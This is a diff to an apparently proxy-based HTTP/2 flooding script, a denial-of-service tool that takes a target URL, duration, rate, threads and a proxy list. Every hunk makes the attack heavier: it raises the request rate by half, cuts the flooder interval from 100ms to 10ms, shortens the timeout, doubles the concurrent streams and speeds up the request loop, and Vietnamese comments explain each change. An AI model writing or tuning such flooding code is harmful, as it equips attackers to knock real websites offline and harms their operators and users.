@@ -50,7 +50,7 @@ function randstr(length) {
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
-    Rate: parseInt(process.argv[4]),
+    Rate: Math.floor(parseInt(process.argv[4]) * 1.5), // Tăng Rate lên 1.5 lần
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 };
@@ -90,7 +90,7 @@ if (cluster.isMaster) {
     }
     setTimeout(() => process.exit(0), args.time * 1000);
 } else {
-    setInterval(runFlooder, 100);
+    setInterval(runFlooder, 10); // Giảm delay từ 100ms xuống 10ms
 }
 
 class NetSocket {
@@ -158,7 +158,7 @@ function runFlooder() {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
         address: parsedTarget.host + ":443",
-        timeout: 5
+        timeout: 3 // Giảm timeout từ 5s xuống 3s
     };
 
     let retryCount = 0;
@@ -194,7 +194,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 1000,
+                maxConcurrentStreams: 2000, // Tăng từ 1000 lên 2000
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536,
                 enablePush: false
@@ -220,7 +220,7 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, 90);
+            }, 50); // Giảm interval từ 90ms xuống 50ms
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
